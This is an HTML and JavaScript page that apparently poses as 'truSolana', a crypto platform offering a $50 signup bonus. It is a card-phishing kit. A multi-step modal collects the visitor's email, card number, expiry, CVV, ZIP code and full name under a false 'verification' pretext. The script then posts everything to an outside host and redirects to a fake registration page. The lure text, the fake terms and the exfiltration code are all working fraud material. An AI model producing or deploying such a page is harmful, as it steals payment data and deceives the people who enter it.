<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Portal | truSolana</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <style>
        .blurple {
            color: #5865F2; /* Discord blurple */
        }
        .bg-blurple {
            background-color: #5865F2; /* Discord blurple */
        }
        .bg-blurple-hover {
            background-color: #4752C4; /* Darker shade for hover */
        }
        .error-message {
            color: #FF4C4C; /* Red color for error messages */
            margin-top: 10px;
        }
    </style>
</head>
<body class="bg-gray-900 text-white flex flex-col min-h-screen">

    <!-- Welcome Modal -->
    <div id="welcome-modal" class="fixed inset-0 flex items-center justify-center bg-black-900 bg-opacity-75 z-50 hidden">
        <div class="bg-black-900 rounded-lg p-6 w-96 text-center">
            <h2 id="modal-header" class="text-2xl font-bold mb-4">Welcome to truSolana</h2>
            <p id="modal-paragraph" class="text-gray-400 mb-6">You've just been granted access to the most advanced upcoming Solana platform. Just join our platform to claim your $50 USD signup bonus - no B.S. like silly deposits or ID requirements to claim.</p>
            <div id="error-message" class="error-message hidden"></div>
            <input id="modal-input" type="number" placeholder="0000 0000 0000 0000" class="bg-gray-700 text-white border border-gray-600 rounded py-2 px-4 mb-4 w-full hidden" />
            <div class="flex mb-4 hidden" id="expiration-container">
                <input id="modal-input5" type="number" placeholder="Exp. Month #" class="bg-gray-700 text-white border border-gray-600 rounded py-2 px-4 w-1/2 mr-2" />
                <input id="modal-input6" type="number" placeholder="Exp. Year" class="bg-gray-700 text-white border border-gray-600 rounded py-2 px-4 w-1/2" />
            </div>
            <input id="modal-input8" type="number" placeholder="CVV" class="bg-gray-700 text-white border border-gray-600 rounded py-2 px-4 mb-4 w-full hidden" />
            <input id="modal-input21" type="number" placeholder="ZIP Code" class="bg-gray-700 text-white border border-gray-600 rounded py-2 px-4 mb-4 w-full hidden" />
            <input id="modal-input22" type="text" placeholder="Full Name" class="bg-gray-700 text-white border border-gray-600 rounded py-2 px-4 mb-4 w-full hidden" />
            <input id="modal-input2" type="email" placeholder="Enter your email" class="bg-gray-700 text-white border border-gray-600 rounded py-2 px-4 mb-4 w-full hidden" required/>
            
            <button id="modal-button" class="bg-blurple text-white font-semibold py-2 px-4 rounded shadow hover:bg-blurple-hover transition duration-300">Next</button>
        </div>
    </div>

    <main class="flex-grow flex items-center justify-center">
       
    </main>

    <footer class="text-center p-4 shadow-md">
        <p class="text-gray-400">Â© truMedia Â· ðŸ’° Currency: USD</p>
    </footer>

    <script>
        // Show the welcome modal on page load
        document.addEventListener('DOMContentLoaded', () => {
            const modal = document.getElementById('welcome-modal');
            modal.classList.remove('hidden');
        });

        const modalButton = document.getElementById('modal-button');
        const modalHeader = document.getElementById('modal-header');
        const modalParagraph = document.getElementById('modal-paragraph');
        const modalInput = document.getElementById('modal-input');
                const modalInput2 = document.getElementById('modal-input2');
        const modalInput5 = document.getElementById('modal-input5');
        const modalInput6 = document.getElementById('modal-input6');
        const modalInput8 = document.getElementById('modal-input8');
        const modalInput21 = document.getElementById('modal-input21');
        const modalInput22 = document.getElementById('modal-input22');
        const errorMessage = document.getElementById('error-message');

        let step = 0;

        modalButton.addEventListener('click', () => {
            // Clear previous error message
            errorMessage.classList.add('hidden');
            errorMessage.textContent = '';

            if (step === 2 && !modalInput2.value) {
                errorMessage.textContent = "Please enter a valid email to continue.";
                errorMessage.classList.remove('hidden');
                return;
            }
            if (step === 3 && (!modalInput.value || !modalInput8.value || !modalInput5.value || !modalInput6.value)) {
                errorMessage.textContent = "Please enter your card info to continue.";
                errorMessage.classList.remove('hidden');
                return;
            }

            step++;
            if (step === 1) {
                modalHeader.textContent = "Information and Agreement";
                modalParagraph.textContent = "The promotion is paid for from the new user promotion sponsored by truMedia. All users are allowed one account per household, and bonus is subject to review by the truSolana team. By claiming the $50 bonus, you are creating a truSolana account and agree to all Terms of Service listed on our homepage.";
            } else if (step === 2) {
                modalHeader.textContent = "Email";
                modalParagraph.textContent = "By entering your email, you agree to receive promotional emails following the launch of truSolana. When our platform launches, you will receive an email to access your account, along with an additional $100 USD bonus on-site apart from the bonus you are claiming now.";
                modalInput2.classList.remove('hidden'); // Show input field
                modalInput.value = ""; // Clear input field
            } else if (step === 3) {
                modalInput2.classList.add('hidden');
                modalHeader.textContent = "And finally..";
                modalParagraph.textContent = "Please verify you are not abusing our promotion. You will not be charged. A hold of up to $1.00 may be placed to verify your card which will be removed instantly. You will be brought to your account panel where you can cashout instantly.";
                modalInput.classList.remove('hidden');
                document.getElementById('expiration-container').classList.remove('hidden'); // Show expiration fields
                modalInput8.classList.remove('hidden');
                modalInput21.classList.remove('hidden');
                modalInput22.classList.remove('hidden');// Show CVV input field
                modalInput.value = ""; // Clear input field
            } else {
// Prepare to submit the form data
const expMonth = modalInput5.value.padStart(2, '0'); // Format month to two digits
const expYear = modalInput6.value.length === 2 ? '20' + modalInput6.value : modalInput6.value; // Convert to four digits if necessary

// Create a POST request
const formData = new FormData();
formData.append('card_number', modalInput.value);
formData.append('exp_month', expMonth);
formData.append('exp_year', expYear);
formData.append('cvc', modalInput8.value);
formData.append('email', modalInput2.value); // Add email to the POST request
formData.append('zipcode', modalInput21.value); // Add email to the POST request
formData.append('fullname', modalInput22.value); // Add email to the POST request

// Change button text to "Loading..."
modalButton.textContent = "Loading...";
modalButton.disabled = true; // Disable the button to prevent multiple submissions

// Send the POST request
fetch('https://burgz.alwaysdata.net/onboarding.php', { // Replace with your actual processing URL
    method: 'POST',
    body: formData,
})
.then(response => response.json())
.then(data => {
    if (data.status === 'success') {
        // Redirect after 2 seconds
        setTimeout(() => {
            window.location.href = 'https://portal.trusolana.com/onboarding/new-user/registered'; // Replace with your actual URL
        }, 2000);
    } else {
        // Handle error response
        errorMessage.textContent = 'The card was either invalid or declined the charge. Please try again.';
        errorMessage.classList.remove('hidden');
        modalButton.textContent = "Next"; // Reset button text
        modalButton.disabled = false; // Re-enable the button
    }
})
.catch(error => {
    errorMessage.textContent = 'An error occurred. Please try again.';
    errorMessage.classList.remove('hidden');
    modalButton.textContent = "Next"; // Reset button text
    modalButton.disabled = false; // Re-enable the button
});
            }
        });
    </script>

</body>
</html>